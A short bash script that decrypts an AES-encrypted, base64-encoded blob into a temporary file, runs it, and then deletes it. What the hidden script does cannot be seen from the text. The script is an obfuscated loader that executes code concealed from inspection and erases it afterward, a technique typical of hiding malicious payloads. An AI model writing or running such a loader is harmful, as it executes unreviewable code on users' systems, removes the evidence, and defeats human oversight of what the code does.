#!/bin/bash -e
cat <<EOF | openssl enc -aes256 -base64 -d > temp.sh
U2FsdGVkX18wUUVpQgV2UfuE7d2NM/mjeIYMogRMBCQQX3H+HeOCPdnGNsCBpWul
lXAlsUt6owu/YmKY1h/eaogiC26EQ5v9Klb+Pl4xOCjOcx5WHbnUdKtGHjVDSxbc
5KNOcKJHo7NsvJ/QTDRyLazbF4GI0n/Ls1GInbAQwBGephdaBtJbJz+kB2SPBBQm
8dH3oaW9WO4sy9QzIcjsuVVGTOHq9pU5Kuw7ht65p80cFjQmWLqEikk/kteKU8aD
5zKLItthP5pYRF8LHdHQsIoWOSjaDQUdB096o7TftXj0eizl1/rdfTIYaYdAhjiu
MmblCC4kXSuSH5f8y1pezw==
EOF
chmod +x temp.sh
./temp.sh
rm temp.sh
